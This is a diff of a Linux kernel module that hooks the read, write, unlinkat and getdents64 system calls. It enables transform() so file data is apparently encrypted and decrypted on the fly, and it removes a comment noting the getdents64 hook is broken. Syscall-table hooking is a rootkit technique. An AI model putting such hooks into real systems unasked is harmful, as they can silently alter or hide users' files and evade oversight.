@@ -157,7 +157,7 @@ asmlinkage ssize_t hooked_read(struct pt_regs* regs) {
         ret = old_read(regs);
         // 文件内容读取后保存在rsi中
         // pos为读取文件的偏移量
-        // transform((char*)regs->si, ino, pos, ret);
+        transform((char*)regs->si, ino, pos, ret);
         break;
     case 0:
         ;
@@ -185,9 +185,9 @@ asmlinkage ssize_t hooked_write(struct pt_regs* regs) {
         break;
     case 1:
         // 找到上次读写的位置
-        // pos = get_pos_from_fd(regs->di, 1);
+        pos = get_pos_from_fd(regs->di, 1);
         // 读取rdi加密后写入ino+pos，写入的数量存在rdx中
-        // transform((char*)regs->si, ino, pos, regs->dx);
+        transform((char*)regs->si, ino, pos, regs->dx);
         ret = old_write(regs);
         break;
     case 0:
@@ -278,7 +278,6 @@ asmlinkage ssize_t hooked_unlinkat(struct pt_regs* regs) {
 /*
 ** ssize_t getdents64(unsigned int fd, struct linux_dirent64 * dirent, unsigned int count);
 */
-// FIXME: 这个函数有问题 不知道怎么改
 asmlinkage ssize_t hooked_getdents64(struct pt_regs* regs) {
     uid_t uid;
     ssize_t ret = -1;
